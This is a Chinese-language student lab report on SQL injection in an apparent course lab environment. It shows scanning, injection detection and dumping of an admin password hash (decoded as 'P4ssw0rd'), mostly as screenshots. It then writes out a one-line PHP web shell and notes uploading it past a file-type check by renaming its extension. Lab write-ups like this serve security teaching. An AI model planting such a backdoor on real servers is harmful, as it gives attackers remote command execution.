# 第三次实验报告·关于SQL注入
## 实验环境
- 服务器：10.0.2.6

![image](https://raw.githubusercontent.com/CUCfromHY001/ns/master/2017-2/MlCjh/%E7%BF%BB%E8%BD%AC%E8%AF%BE%E5%A0%82Cjh/03/%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE/2.PNG)
- 攻击者：10.0.2.5

![image](https://raw.githubusercontent.com/CUCfromHY001/ns/master/2017-2/MlCjh/%E7%BF%BB%E8%BD%AC%E8%AF%BE%E5%A0%82Cjh/03/%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE/1.PNG)
## 实验过程
#### 1. 初步嗅探
服务器开启端口

![image](https://raw.githubusercontent.com/CUCfromHY001/ns/master/2017-2/MlCjh/%E7%BF%BB%E8%BD%AC%E8%AF%BE%E5%A0%82Cjh/03/%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE/3.PNG)

服务器配置信息

![image](https://raw.githubusercontent.com/CUCfromHY001/ns/master/2017-2/MlCjh/%E7%BF%BB%E8%BD%AC%E8%AF%BE%E5%A0%82Cjh/03/%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE/4.PNG)

服务器文件信息

![image](https://raw.githubusercontent.com/CUCfromHY001/ns/master/2017-2/MlCjh/%E7%BF%BB%E8%BD%AC%E8%AF%BE%E5%A0%82Cjh/03/%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE/5.PNG)

#### 2.检测SQL漏洞
 
正常查询

![image](https://raw.githubusercontent.com/CUCfromHY001/ns/master/2017-2/MlCjh/%E7%BF%BB%E8%BD%AC%E8%AF%BE%E5%A0%82Cjh/03/%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE/6.PNG)

基于整数的检测，==由此发现存在SQL注入漏洞。==

![image](https://raw.githubusercontent.com/CUCfromHY001/ns/master/2017-2/MlCjh/%E7%BF%BB%E8%BD%AC%E8%AF%BE%E5%A0%82Cjh/03/%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE/7.PNG)

#### 3.利用漏洞
嗅探数据库相关信息

![image](https://raw.githubusercontent.com/CUCfromHY001/ns/master/2017-2/MlCjh/%E7%BF%BB%E8%BD%AC%E8%AF%BE%E5%A0%82Cjh/03/%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE/8.PNG)
![image](https://raw.githubusercontent.com/CUCfromHY001/ns/master/2017-2/MlCjh/%E7%BF%BB%E8%BD%AC%E8%AF%BE%E5%A0%82Cjh/03/%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE/9.PNG)

根据嗅探结果构造查询式，发现敏感信息.

![image](https://raw.githubusercontent.com/CUCfromHY001/ns/master/2017-2/MlCjh/%E7%BF%BB%E8%BD%AC%E8%AF%BE%E5%A0%82Cjh/03/%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE/10.PNG)

根据敏感信息，即可查询管理员密码

![image](https://raw.githubusercontent.com/CUCfromHY001/ns/master/2017-2/MlCjh/%E7%BF%BB%E8%BD%AC%E8%AF%BE%E5%A0%82Cjh/03/%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE/11.PNG)

 ==MD5解码工具，解码得到管理员密码：P4ssw0rd.==
 
 #### 4.植入后门
 构造php脚本
 
```
<?php
  system($_GET['cmd']);
?>
```
上传文件，发现上传文件限制

![image](https://raw.githubusercontent.com/CUCfromHY001/ns/master/2017-2/MlCjh/%E7%BF%BB%E8%BD%AC%E8%AF%BE%E5%A0%82Cjh/03/%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE/12.PNG)
![image](https://raw.githubusercontent.com/CUCfromHY001/ns/master/2017-2/MlCjh/%E7%BF%BB%E8%BD%AC%E8%AF%BE%E5%A0%82Cjh/03/%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE/13.PNG)

经过更改文件后缀名后，发现上传成功

![image](https://raw.githubusercontent.com/CUCfromHY001/ns/master/2017-2/MlCjh/%E7%BF%BB%E8%BD%AC%E8%AF%BE%E5%A0%82Cjh/03/%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE/14.PNG)
![image](https://raw.githubusercontent.com/CUCfromHY001/ns/master/2017-2/MlCjh/%E7%BF%BB%E8%BD%AC%E8%AF%BE%E5%A0%82Cjh/03/%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE/15.PNG)

后门检测，发现运行成功。
![image](https://raw.githubusercontent.com/CUCfromHY001/ns/master/2017-2/MlCjh/%E7%BF%BB%E8%BD%AC%E8%AF%BE%E5%A0%82Cjh/03/%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE/16.PNG)


实验完成。





